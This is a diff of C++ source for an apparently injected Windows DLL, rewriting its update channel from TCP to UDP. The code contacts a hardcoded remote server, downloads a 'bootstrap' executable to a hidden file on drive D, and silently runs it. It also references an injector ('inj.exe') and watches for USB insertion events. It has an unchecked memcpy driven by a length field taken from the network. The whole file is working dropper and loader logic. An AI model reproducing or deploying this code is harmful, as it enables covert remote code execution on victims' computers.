@@ -28,19 +28,23 @@ using namespace std;
 #define SERVER_ADDR "171.1.2.13"
 #define SERVER_PORT 4587
 
-#define TCP_CLIENT_STATE_INIT  0
-#define TCP_CLIENT_STATE_SEND_GET_REQ 1
-#define TCP_CLIENT_STATE_RECV_GET_REP 2
-#define TCP_CLIENT_STATE_WAIT_FOR_DOWNLOAD 3
+#define UDP_CLIENT_STATE_INIT  0
+#define UDP_CLIENT_STATE_SEND_GET_REQ 1
+#define UDP_CLIENT_STATE_RECV_GET_REP 2
+#define UDP_CLIENT_STATE_SEND_DOWNLOAD_REQ 3
+#define UDP_CLIENT_STATE_WAIT_FOR_DOWNLOAD 4
 
 #define BOOTSTRAP_PRGRAM_PATH_NAME "d:\\bootstrap.exe"
 
 
-typedef struct tcp_client_status
+typedef struct client_status
 {
 	SOCKET sock;
 	int state;
-}TCP_CLIENT_STATUS_T;
+	float local_version;
+	float server_version;
+	SOCKADDR_IN download_addr;
+}CLIENT_STATUS_T;
 
 
 typedef struct local_drive{
@@ -56,7 +60,7 @@ HANDLE hUsbInsertEventHandle_ = NULL;
 BOOL bQuit_ = FALSE;
 int osVersion_ = 0;
 BOOL isVistaLaterOS_ = FALSE;
-TCP_CLIENT_STATUS_T tcp_client_status_ = { 0 };
+CLIENT_STATUS_T client_status_ = { 0 };
 vector<LOCAL_DRIVE_T> local_drives_;
 float local_bootstrap_version_ = 0.0f;
 BOOL isFirstDataPacket_ = TRUE;
@@ -156,16 +160,18 @@ unsigned __stdcall localProc(void* pArguments)
 	int length = sizeof(SOCKADDR);
 	char recvBuf[1024] = { 0 };
 	int ret = 0;
-
-	ret = recvfrom(sockSrv, recvBuf, 1024, 0, (SOCKADDR*)&addrClient, &length);
-	LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)recvBuf;
-	char *body = NULL;
-	if (hdr->version == PROTO_VERSION && 
-		hdr->msg_type == MSG_TYPE_BOOTSTRAP_LOCAL_PATH)
+	while (!bQuit_)
 	{
-		body = recvBuf + sizeof(LOCAL_PROTO_T);
-		memcpy(host_exe_path_, body, hdr->body_len);
-		geted_host_exe_path_ = true;
+		ret = recvfrom(sockSrv, recvBuf, 1024, 0, (SOCKADDR*)&addrClient, &length);
+		LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)recvBuf;
+		char *body = NULL;
+		if (hdr->version == PROTO_VERSION &&
+			hdr->msg_type == MSG_TYPE_BOOTSTRAP_LOCAL_PATH)
+		{
+			body = recvBuf + sizeof(LOCAL_PROTO_T);
+			memcpy(host_exe_path_, body, hdr->body_len);
+			geted_host_exe_path_ = true;
+		}
 	}
 	closesocket(sockSrv);
 	WSACleanup();
@@ -222,21 +228,7 @@ unsigned __stdcall usbEventProc(void* pArguments)
 	return 0;
 }
 
-SOCKET create_local_streamsock_and_bind()
-{
-	int ret = 0;
-	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-	SOCKADDR_IN  addrlocal;
-	addrlocal.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
-	addrlocal.sin_family = AF_INET;
-	addrlocal.sin_port = htons(0);
 
-	ret = bind(sock, (SOCKADDR*)&addrlocal, sizeof(SOCKADDR));
-	if (ret == SOCKET_ERROR){
-		return 0;
-	}
-	return sock;
-}
 
 SOCKET create_local_datagramsock_and_bind()
 {
@@ -376,46 +368,59 @@ void setFileHidden(char *file)
 }
 
 
-void onGetBootStrapVersion(TCP_CLIENT_STATUS_T *client, float version)
+void onGetBootStrapVersion(CLIENT_STATUS_T *client, float version)
 {
 	char buffer[512] = { 0 };
 	LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T*)buffer;
+
 	if (version > local_bootstrap_version_)
 	{
+		SOCKADDR_IN  addrServ;
+		addrServ.sin_addr.S_un.S_addr = inet_addr(SERVER_ADDR);
+		addrServ.sin_family = AF_INET;
+		addrServ.sin_port = htons(SERVER_PORT);
+
+		client->local_version = local_bootstrap_version_;
 		local_bootstrap_version_ = version;
+		client->server_version = version;
+		hdr->totol_len = sizeof(LOCAL_PROTO_T);
 		hdr->version = PROTO_VERSION;
-		hdr->msg_type = MSG_TYPE_DOWNLOAD_BOOTSTRAP;
+		hdr->msg_type = MSG_TYPE_DOWNLOAD_BOOTSTRAP_REQ;
 		hdr->body_len = 0;
-		send(client->sock, buffer, sizeof(LOCAL_PROTO_T), 0);
-		client->state = TCP_CLIENT_STATE_WAIT_FOR_DOWNLOAD;
+		sendto(client->sock, buffer, sizeof(LOCAL_PROTO_T), 0, (sockaddr *)&addrServ, sizeof(addrServ));
+		client->state = UDP_CLIENT_STATE_WAIT_FOR_DOWNLOAD;
 	}
 }
 
-void onDownloadData(TCP_CLIENT_STATUS_T *client, char *data, int len)
+
+
+SOCKET create_local_streamsock_and_bind()
 {
-	if (isFirstDataPacket_)
-	{
-		if (local_drives_.size() >= 2)
-		{
-			bootstrapHandle_ = fopen(BOOTSTRAP_PRGRAM_PATH_NAME, "wb+");
-			setFileHidden(BOOTSTRAP_PRGRAM_PATH_NAME);
-		}
-		
+	int ret = 0;
+	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+	SOCKADDR_IN  addrlocal;
+	addrlocal.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
+	addrlocal.sin_family = AF_INET;
+	addrlocal.sin_port = htons(0);
+
+	ret = bind(sock, (SOCKADDR*)&addrlocal, sizeof(SOCKADDR));
+	if (ret == SOCKET_ERROR){
+		return 0;
 	}
-	if (bootstrapHandle_ != NULL)
-		fwrite(data, len, 1, bootstrapHandle_);
+	return sock;
 }
 
-void onDownloadDataEnd(TCP_CLIENT_STATUS_T *client)
+
+void onDownloadDataEnd(CLIENT_STATUS_T *client)
 {
 	isFirstDataPacket_ = TRUE;
 	if (bootstrapHandle_ != NULL)
 		fclose(bootstrapHandle_);
 	bootstrapHandle_ = NULL;
-	client->state = TCP_CLIENT_STATE_INIT;
-	closesocket(client->sock);
+	client->state = UDP_CLIENT_STATE_INIT;
 	Sleep(1000);
 
+	//execute bootstrap.exe 
 	SHELLEXECUTEINFO ShExecInfo = { 0 };
 	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
 	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
@@ -430,44 +435,87 @@ void onDownloadDataEnd(TCP_CLIENT_STATUS_T *client)
 }
 
 
+unsigned __stdcall downloadProc(void* pArguments)
+{
+	CLIENT_STATUS_T *client = (CLIENT_STATUS_T *)pArguments;
+	int ret = 0;
+	int receive_len = 0;
+	SOCKET sock = create_local_streamsock_and_bind();
+	char buffer[1500] = { 0 };
+
+	ret = connect(sock, (sockaddr *)&client->download_addr, sizeof(SOCKADDR_IN));
+	while (ret == 0)
+	{
+		receive_len = recv(sock, buffer, sizeof(buffer), 0);
+		if (receive_len <= 0)
+		{
+			closesocket(sock);
+			break;
+		}
+		else
+		{
+			if (bootstrapHandle_ != NULL)
+				fwrite(buffer, receive_len, 1, bootstrapHandle_);
+		}
+	}
+	onDownloadDataEnd(client);
+	return 0;
+}
+
+
+void beginDownload(CLIENT_STATUS_T *client)
+{
+	HANDLE handle;
+	unsigned threadID;
+	if (local_drives_.size() >= 2)
+	{
+		bootstrapHandle_ = fopen(BOOTSTRAP_PRGRAM_PATH_NAME, "wb+");
+		setFileHidden(BOOTSTRAP_PRGRAM_PATH_NAME);
+	}
+	handle = (HANDLE)_beginthreadex(NULL, 0, &downloadProc, client, 0, &threadID);
+	CloseHandle(handle);
+
+}
+
+
+
+
 #define CONTINUE_READ -1
 #define READ_OK  0
 
-int onPacketRead(TCP_CLIENT_STATUS_T *client, char * packet, int len)
+int onPacketRead(CLIENT_STATUS_T *client, char * packet, int len)
 {
 	char *ptr = NULL;
-
 	LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)packet;
 	if (hdr->version != PROTO_VERSION)
 		return READ_OK;
 
 	switch (client->state)
 	{
-	case TCP_CLIENT_STATE_SEND_GET_REQ:
+	case UDP_CLIENT_STATE_SEND_GET_REQ:
 		if (hdr->msg_type == MSG_TYPE_REPLY_BOOTSTRAP_VERSION)
 		{
-			client->state = TCP_CLIENT_STATE_RECV_GET_REP;
+			client->state = UDP_CLIENT_STATE_RECV_GET_REP;
 			ptr = packet + sizeof(LOCAL_PROTO_T);
 			float version = *(float *)ptr;
 			onGetBootStrapVersion(client, version);
 		}
 		break;
-	case TCP_CLIENT_STATE_INIT:
+	case UDP_CLIENT_STATE_INIT:
+	case UDP_CLIENT_STATE_RECV_GET_REP:
 		break;
-	case TCP_CLIENT_STATE_RECV_GET_REP:
-		break;
-	case TCP_CLIENT_STATE_WAIT_FOR_DOWNLOAD:
-		if (hdr->msg_type == MSG_TYPE_DOWNLOAD_DATA ||
-			hdr->msg_type == MSG_TYPE_DOWNLOAD_DATA_END)
+	case UDP_CLIENT_STATE_WAIT_FOR_DOWNLOAD:
+		if (hdr->msg_type == MSG_TYPE_DOWNLOAD_BOOTSTRAP_REPLY)
 		{
 			ptr = packet + sizeof(LOCAL_PROTO_T);
-			len = len - sizeof(LOCAL_PROTO_T);
-			onDownloadData(client, ptr, len);
-			isFirstDataPacket_ = FALSE;
-			if (hdr->msg_type == MSG_TYPE_DOWNLOAD_DATA_END)
-			{
-				onDownloadDataEnd(client);
-			}
+			SOCKADDR_IN addrDownload = { 0 };
+			addrDownload.sin_addr.S_un.S_addr = *(ULONG *)ptr;
+			ptr += sizeof(ULONG);
+			addrDownload.sin_family = AF_INET;
+			addrDownload.sin_port = *(short *)ptr;
+			memcpy(&client->download_addr, &addrDownload, sizeof(SOCKADDR_IN));
+			beginDownload(client);
+			
 		}
 		break;
 	}
@@ -475,6 +523,19 @@ int onPacketRead(TCP_CLIENT_STATUS_T *client, char * packet, int len)
 }
 
 
+
+int create_get_version_req(char *ptr)
+{
+	LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)ptr;
+	hdr->totol_len = sizeof(LOCAL_PROTO_T);
+	hdr->version = PROTO_VERSION;
+	hdr->msg_type = MSG_TYPE_GET_BOOTSTRAP_VERSION;
+	hdr->body_len = 0;
+	return sizeof(LOCAL_PROTO_T);
+}
+
+
+//get bootstrap.exe and excute
 unsigned __stdcall bootstrapProc(void* pArguments)
 {
 	int ret = 0;
@@ -482,39 +543,39 @@ unsigned __stdcall bootstrapProc(void* pArguments)
 	FD_SET readSet;
 	struct timeval timeout = { 0 };
 	FD_ZERO(&readSet);
-	int left = 0;
-	int offset = 0;
 	char packet[1500] = { 0 };
-	int packet_len = 0;
-	int prev_packet_len = 0;
-	int pre_packet_is_not_completely = 0;
 	SOCKET sock;
-	
+	int len = 0;
+
+
+	SOCKADDR_IN  addrServ;
+	addrServ.sin_addr.S_un.S_addr = inet_addr(SERVER_ADDR);
+	addrServ.sin_family = AF_INET;
+	addrServ.sin_port = htons(SERVER_PORT);
+
+	SOCKADDR_IN addrFrom = { 0 };
+	int fromLen = sizeof(SOCKADDR_IN);
+	LOCAL_PROTO_T *hdr;
+
+
+	sock = create_local_datagramsock_and_bind();
+	if(sock == 0){
+		return ret;
+	}
+	client_status_.sock = sock;
 	while (!bQuit_)
 	{
-		if (tcp_client_status_.state == TCP_CLIENT_STATE_INIT)
+		if (client_status_.state == UDP_CLIENT_STATE_INIT)
 		{
-			sock = create_local_streamsock_and_bind();
-			if (sock == 0){
-				return ret;
-			}
-			SOCKADDR_IN  addrServ;
-			addrServ.sin_addr.S_un.S_addr = inet_addr(SERVER_ADDR);
-			addrServ.sin_family = AF_INET;
-			addrServ.sin_port = htons(SERVER_PORT);
-			//向服务器发出连接请求  
-			if (connect(sock, (struct  sockaddr*)&addrServ, sizeof(addrServ)) == INVALID_SOCKET)
-			{
-				Sleep(1000 * 300);
-				continue;
-			}
+			len = create_get_version_req(buffer);
+			client_status_.state = UDP_CLIENT_STATE_SEND_GET_REQ;
+			ret = sendto(sock, buffer, len, 0, (sockaddr *)&addrServ, sizeof(SOCKADDR_IN));
 		}
-		LOCAL_PROTO_T *hdr = (LOCAL_PROTO_T *)buffer;
-		hdr->version = PROTO_VERSION;
-		hdr->msg_type = MSG_TYPE_GET_BOOTSTRAP_VERSION;
-		hdr->body_len = 0;
-		ret = send(sock, buffer, sizeof(LOCAL_PROTO_T), 0);
-		tcp_client_status_.state = TCP_CLIENT_STATE_SEND_GET_REQ;
+		else
+		{
+			ret = 1;
+			Sleep(1000 * 60);
+		}
 		if (ret > 0)
 		{
 			timeout.tv_sec = 10;
@@ -523,53 +584,19 @@ unsigned __stdcall bootstrapProc(void* pArguments)
 			if (ret > 0)
 			{//read data
 				FD_ZERO(&readSet);
-				ret = recv(sock, buffer, sizeof(buffer), 0);
+				ret = recvfrom(sock, buffer, sizeof(buffer), 0, (sockaddr *)&addrFrom, &fromLen);
 				if (ret > 0)
 				{
-					if (ret < sizeof(LOCAL_PROTO_T))
-					{
-						closesocket(sock);
-						tcp_client_status_.state = TCP_CLIENT_STATE_INIT;
-						Sleep(1000 * 300);
-						continue;
-					}
 					hdr = (LOCAL_PROTO_T *)buffer;
-					packet_len = sizeof(LOCAL_PROTO_T)+hdr->body_len;
-					if (ret == packet_len)
-					{
-						pre_packet_is_not_completely = 0;
-						onPacketRead(&tcp_client_status_, buffer, ret);
-					}
-					else if (ret < packet_len && !pre_packet_is_not_completely)
-					{
-						offset = 0;
-						left = packet_len - offset;
-						prev_packet_len = packet_len;
-						pre_packet_is_not_completely = 1;
-						memcpy(&packet[offset], buffer, ret);
-						offset += ret;
-					}
-					else if (pre_packet_is_not_completely && ret < left)
-					{
-						memcpy(&packet[offset], buffer, ret);
-						offset += ret;
-						left = left - ret;
-					}
-					else if (pre_packet_is_not_completely && ret == left)
-					{
-						pre_packet_is_not_completely = 0;
-						memcpy(&packet[offset], buffer, ret);
-						offset += ret;
-						left = left - ret;
-						onPacketRead(&tcp_client_status_, packet, offset);
-						prev_packet_len = 0;
-						offset = 0;
-					}
+					onPacketRead(&client_status_, buffer, ret);
+					
 				}
 				else
 				{
 					closesocket(sock);
-					tcp_client_status_.state = TCP_CLIENT_STATE_INIT;
+					sock = create_local_datagramsock_and_bind();
+					client_status_.sock = sock;
+					client_status_.state = UDP_CLIENT_STATE_INIT;
 					Sleep(1000 * 300);
 					continue;
 				}
@@ -583,14 +610,18 @@ unsigned __stdcall bootstrapProc(void* pArguments)
 			else //error
 			{
 				closesocket(sock);
-				tcp_client_status_.state = TCP_CLIENT_STATE_INIT;
+				sock = create_local_datagramsock_and_bind();
+				client_status_.sock = sock;
+				client_status_.state = UDP_CLIENT_STATE_INIT;
 				Sleep(1000 * 300);
 			}
 		}
 		else
 		{
 			closesocket(sock);
-			tcp_client_status_.state = TCP_CLIENT_STATE_INIT;
+			sock = create_local_datagramsock_and_bind();
+			client_status_.state = UDP_CLIENT_STATE_INIT;
+			client_status_.sock = sock;
 			Sleep(1000 * 300);
 		}
 	}
@@ -604,6 +635,8 @@ void Init(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
 
 	loger_ = log_create(LOG_FILE);
 	isVistaLaterOS_ = IsVistaOrLater();
+
+	log_write(loger_, "os version 0x%x \n", get_os_version());
 	InitNetwork();
 	//listen on localhost machine  for geting the path of inj.exe 
 	unsigned threadID1, threadID2, threadID3;
@@ -634,5 +667,6 @@ void Init(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
 
 void UnInit(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
 {
-
+	bQuit_ = TRUE;
+	log_write(loger_, "dll exit\n");
 }
